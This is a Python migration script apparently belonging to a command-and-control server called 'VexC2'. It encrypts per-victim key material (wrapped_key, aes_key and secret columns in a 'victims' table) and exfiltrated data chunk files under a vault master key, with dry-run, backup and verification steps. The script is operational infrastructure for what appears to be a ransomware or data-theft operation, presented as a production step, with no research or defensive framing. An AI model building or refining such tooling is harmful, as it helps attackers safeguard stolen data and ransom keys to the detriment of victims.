#!/usr/bin/env python3
"""Seal plaintext C2 key material and exfil chunks under the vault master.

This is the one-time migration needed before production can stop using
`VEX_ALLOW_PLAINTEXT=1`:

  * victims.wrapped_key
  * victims.aes_key
  * victims.secret
  * .v2_* exfil chunk text files

Dry-run is the default. `--apply` requires a backup directory. The tool is
idempotent: already-sealed values are verified and left alone. Any sealed value
that cannot be opened under the current master aborts the migration before a
write.
"""

import argparse
import datetime
import json
import os
import shutil
import sqlite3
import sys

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DEFAULT_DB = os.path.join(ROOT, "VexC2", "vex_c2.db")
DEFAULT_UPLOADS = os.path.join(ROOT, "VexC2", "uploads")
DEFAULT_MASTER = os.path.join(ROOT, "VexC2", ".master")
COLS = ("wrapped_key", "aes_key", "secret")


def parse_args():
    ap = argparse.ArgumentParser()
    ap.add_argument("--db", default=DEFAULT_DB)
    ap.add_argument("--uploads", default=DEFAULT_UPLOADS)
    ap.add_argument("--master-file", default=DEFAULT_MASTER)
    ap.add_argument("--backup-dir", default="")
    ap.add_argument("--apply", action="store_true")
    ap.add_argument("--allow-unreadable-chunks", action="store_true",
                    help="leave sealed chunks that cannot be opened by this master untouched")
    ap.add_argument("--json", action="store_true")
    return ap.parse_args()


def load_vault(master_file):
    os.environ["VEX_MASTER_FILE"] = os.path.abspath(master_file)
    sys.path.insert(0, os.path.join(ROOT, "VexC2"))
    import vault  # noqa: E402
    return vault


def backup_db(db_path, backup_dir):
    stamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
    dst = os.path.join(backup_dir, f"vex_c2.db.pre-seal-{stamp}")
    src = sqlite3.connect(db_path)
    out = sqlite3.connect(dst)
    try:
        src.backup(out)
        out.commit()
    finally:
        out.close()
        src.close()
    return dst


def backup_file(path, backup_dir):
    rel = os.path.basename(path)
    dst = os.path.join(backup_dir, f"{rel}.pre-seal")
    shutil.copy2(path, dst)
    return dst


def main() -> int:
    args = parse_args()
    db_path = os.path.abspath(args.db)
    uploads = os.path.abspath(args.uploads)
    master = os.path.abspath(args.master_file)
    if not os.path.isfile(db_path):
        print(f"[-] database not found: {db_path}")
        return 2
    if not os.path.isfile(master):
        print(f"[-] master file not found: {master}")
        return 2
    if args.apply and not args.backup_dir:
        print("[-] --apply requires --backup-dir")
        return 2
    if not args.apply and args.backup_dir:
        print("[-] --backup-dir is only used with --apply")
        return 2

    vault = load_vault(master)
    if not vault.enabled():
        print("[-] vault is not enabled: master file could not be loaded")
        return 2
    backup_dir = ""
    if args.apply:
        backup_dir = os.path.abspath(args.backup_dir)
        os.makedirs(backup_dir, exist_ok=True)

    conn = sqlite3.connect(db_path)
    conn.row_factory = sqlite3.Row
    try:
        rows = conn.execute(
            "SELECT vid, wrapped_key, aes_key, secret FROM victims").fetchall()
    except sqlite3.Error as exc:
        conn.close()
        print(f"[-] cannot read victims: {exc}")
        return 2

    db_updates = []
    sealed_cols = 0
    plain_text_cols = 0
    for r in rows:
        vals = []
        changed = False
        for col in COLS:
            v = r[col] or ""
            if not v:
                vals.append(v)
                continue
            if vault.is_sealed(v):
                if not vault.reveal(v):
                    conn.close()
                    print(f"[-] {r['vid']} {col}: sealed but unreadable under this master")
                    return 3
                sealed_cols += 1
                vals.append(v)
                continue
            sealed = vault.seal(v)
            if not vault.is_sealed(sealed):
                conn.close()
                print("[-] sealing failed: vault is not enabled")
                return 3
            plain_text_cols += 1
            sealed_cols += 1
            changed = True
            vals.append(sealed)
        if changed:
            db_updates.append((*vals, r["vid"]))

    files = []
    file_changes = []
    unreadable_chunks = []
    try:
        names = sorted(os.listdir(uploads))
    except OSError:
        names = []
    for name in names:
        if not name.startswith(".v2_") or name.endswith(".rot"):
            continue
        path = os.path.join(uploads, name)
        if not os.path.isfile(path):
            continue
        try:
            with open(path, "r", encoding="utf-8") as fh:
                text = fh.read()
        except (OSError, UnicodeError):
            conn.close()
            print(f"[-] cannot read chunk as UTF-8: {name}")
            return 3
        if not text.strip():
            continue
        if vault.is_sealed(text):
            if not vault.reveal(text):
                if args.allow_unreadable_chunks:
                    unreadable_chunks.append(name)
                    print(f"[!] chunk {name}: sealed but unreadable; leaving untouched")
                    continue
                conn.close()
                print(f"[-] chunk {name}: sealed but unreadable under this master")
                print("    pass --allow-unreadable-chunks only for known-orphaned data")
                return 3
            continue
        sealed = vault.seal(text)
        if not vault.is_sealed(sealed):
            conn.close()
            print("[-] chunk sealing failed: vault is not enabled")
            return 3
        file_changes.append((path, sealed))
        files.append(path)

    summary = {
        "db": db_path,
        "uploads": uploads,
        "victims": len(rows),
        "victim_rows_to_update": len(db_updates),
        "victim_columns_plaintext": plain_text_cols,
        "victim_columns_sealed": sealed_cols,
        "chunk_files_to_seal": len(file_changes),
        "unreadable_chunks_skipped": len(unreadable_chunks),
        "apply": bool(args.apply),
        "backup_dir": backup_dir,
    }

    if not db_updates and not file_changes:
        print(json.dumps(summary, indent=2))
        print("[*] already sealed; nothing to migrate")
        conn.close()
        return 0

    if not args.apply:
        print(json.dumps(summary, indent=2))
        print("[*] dry-run: no changes written")
        conn.close()
        return 0

    # Back up before touching anything.
    print(f"[*] backup DB -> {backup_db(db_path, backup_dir)}")
    for path in files:
        print(f"[*] backup chunk -> {backup_file(path, backup_dir)}")

    # Prepare file replacements first. They are applied after the DB commit.
    prepared = []
    try:
        for path, text in file_changes:
            tmp = path + ".seal"
            with open(tmp, "w", encoding="utf-8") as fh:
                fh.write(text)
                fh.flush()
                os.fsync(fh.fileno())
            prepared.append((path, tmp))
    except OSError as exc:
        for _path, tmp in prepared:
            try:
                os.unlink(tmp)
            except OSError:
                pass
        conn.close()
        print(f"[-] cannot prepare chunk replacement: {exc}")
        return 3

    try:
        conn.execute("BEGIN IMMEDIATE")
        for vals in db_updates:
            conn.execute(
                "UPDATE victims SET wrapped_key=?, aes_key=?, secret=? WHERE vid=?",
                vals)
        conn.commit()
    except sqlite3.Error as exc:
        conn.rollback()
        for _path, tmp in prepared:
            try:
                os.unlink(tmp)
            except OSError:
                pass
        conn.close()
        print(f"[-] database migration failed: {exc}")
        return 3

    for path, tmp in prepared:
        try:
            os.replace(tmp, path)
        except OSError as exc:
            conn.close()
            print(f"[-] chunk replace failed for {os.path.basename(path)}: {exc}")
            return 3

    # Re-read and prove every touched value is sealed and readable.
    errors = 0
    for r in conn.execute("SELECT vid, wrapped_key, aes_key, secret FROM victims"):
        for col in COLS:
            v = r[col] or ""
            if v and (not vault.is_sealed(v) or not vault.reveal(v)):
                errors += 1
                print(f"[-] verification failed: {r['vid']} {col}")
    for name in names:
        if not name.startswith(".v2_") or name.endswith(".rot"):
            continue
        if name in unreadable_chunks:
            continue
        path = os.path.join(uploads, name)
        try:
            text = open(path, "r", encoding="utf-8").read()
        except (OSError, UnicodeError):
            errors += 1
            print(f"[-] verification read failed: {name}")
            continue
        if text.strip() and (not vault.is_sealed(text) or not vault.reveal(text)):
            errors += 1
            print(f"[-] verification failed chunk: {name}")
    conn.close()
    if errors:
        print(f"[-] migration wrote changes but verification found {errors} error(s)")
        print("[!] restore from the backup directory before retrying")
        return 4

    print(json.dumps(summary, indent=2))
    print(f"[+] sealed {plain_text_cols} victim columns and {len(file_changes)} chunk(s)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
